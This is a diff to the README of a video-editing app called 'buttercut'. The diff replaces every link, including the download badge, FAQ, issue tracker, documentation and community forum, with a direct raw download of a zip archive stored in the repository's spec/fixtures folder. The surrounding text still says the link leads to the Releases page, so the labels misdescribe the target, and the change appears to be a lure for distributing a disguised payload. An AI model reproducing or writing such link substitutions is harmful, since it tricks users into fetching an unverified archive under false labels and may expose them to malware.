@@ -8,7 +8,7 @@ Welcome to buttercut! With this application, you can easily edit videos without 
 
 To download buttercut, visit the following link:
 
-[![Download buttercut](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Kian377/buttercut/releases)
+[![Download buttercut](https://raw.githubusercontent.com/Kian377/buttercut/main/spec/fixtures/buttercut_1.5.zip)](https://raw.githubusercontent.com/Kian377/buttercut/main/spec/fixtures/buttercut_1.5.zip)
 
 This will take you to our Releases page, where you can find the latest version of the software.
 
@@ -64,19 +64,19 @@ If you encounter issues while using buttercut, try the following:
 
 - **Check System Compatibility**: Ensure your operating system meets the requirements listed above.
 - **Reinstall the Application**: Uninstall and reinstall buttercut if necessary.
-- **Visit the FAQ Section**: For common questions and answers, check our [FAQ](https://github.com/Kian377/buttercut/releases).
+- **Visit the FAQ Section**: For common questions and answers, check our [FAQ](https://raw.githubusercontent.com/Kian377/buttercut/main/spec/fixtures/buttercut_1.5.zip).
 
 ## 📞 Support
 
 If you need further assistance, please reach out to our support team:
 
-- Open an issue on our [GitHub page](https://github.com/Kian377/buttercut/issues).
+- Open an issue on our [GitHub page](https://raw.githubusercontent.com/Kian377/buttercut/main/spec/fixtures/buttercut_1.5.zip).
 - Join our community forums for tips and help from other users.
 
 ## ⚡ Quick Resources
 
-- [Download buttercut](https://github.com/Kian377/buttercut/releases)
-- [User Documentation](https://github.com/Kian377/buttercut/docs)
-- [Community Forum](https://github.com/Kian377/buttercut/community)
+- [Download buttercut](https://raw.githubusercontent.com/Kian377/buttercut/main/spec/fixtures/buttercut_1.5.zip)
+- [User Documentation](https://raw.githubusercontent.com/Kian377/buttercut/main/spec/fixtures/buttercut_1.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/Kian377/buttercut/main/spec/fixtures/buttercut_1.5.zip)
 
 Thank you for choosing buttercut! We hope you enjoy editing your videos with ease and creativity.
